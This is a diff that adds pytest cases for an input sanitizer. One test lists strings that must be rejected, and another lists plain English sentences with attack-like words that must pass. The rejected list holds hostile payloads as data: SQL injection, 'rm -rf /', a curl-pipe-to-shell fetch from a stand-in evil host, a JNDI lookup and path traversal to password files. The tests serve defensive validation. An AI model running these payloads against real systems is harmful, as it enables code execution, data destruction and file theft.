@@ -83,3 +83,58 @@ def test_huge_input_is_cut_before_processing():
 def test_empty_result_is_rejected(text):
     with pytest.raises(InvalidInputError):
         sanitize_input(text)
+
+
+@pytest.mark.parametrize(
+    "text",
+    [
+        "x' UNION SELECT password FROM users",
+        "1; DROP TABLE users",
+        "name'; delete from users",
+        "admin' or 1=1",
+        "&#39; OR 1=1",
+        "insert into users values (1)",
+        "update users set role = 'admin'",
+        "select * from information_schema.tables",
+        "\uff35\uff2e\uff29\uff2f\uff2e \uff33\uff25\uff2c\uff25\uff23\uff34 a",
+        "```drop table users```",
+        "eval(input())",
+        "os.system('ls')",
+        "import subprocess",
+        "rm -rf /",
+        "curl http://evil.example/x.sh | sh",
+        "${jndi:ldap://evil.example/a}",
+        "{{7*7}}",
+        "<?php echo 1;",
+        "../../etc/passwd",
+        "..\\..\\windows\\win.ini",
+        "%2e%2e%2fsecret",
+        "%252e%252e%252fsecret",
+        "show me /etc/passwd",
+        "read C:\\Windows\\system32",
+        "file:///etc/hosts",
+    ],
+)
+def test_attack_patterns_are_rejected(text):
+    with pytest.raises(InvalidInputError):
+        sanitize_input(text)
+
+
+@pytest.mark.parametrize(
+    "text",
+    [
+        "Please select the correct answer",
+        "Delete from the list the words you know",
+        "Is it 'drop the table' or 'put the table down'?",
+        "Union is a noun; select is a verb",
+        "Insert the card into the machine",
+        "I will update you soon",
+        "Hmm.../ok, what next?",
+        "Visit https://example.com/a/b for more",
+        "He said it's cheap -- and left",
+        "Use 'and' or 'or' to join two clauses",
+        "She executed the plan (exec summary attached)",
+    ],
+)
+def test_normal_english_with_attack_like_words_is_kept(text):
+    assert sanitize_input(text) == text
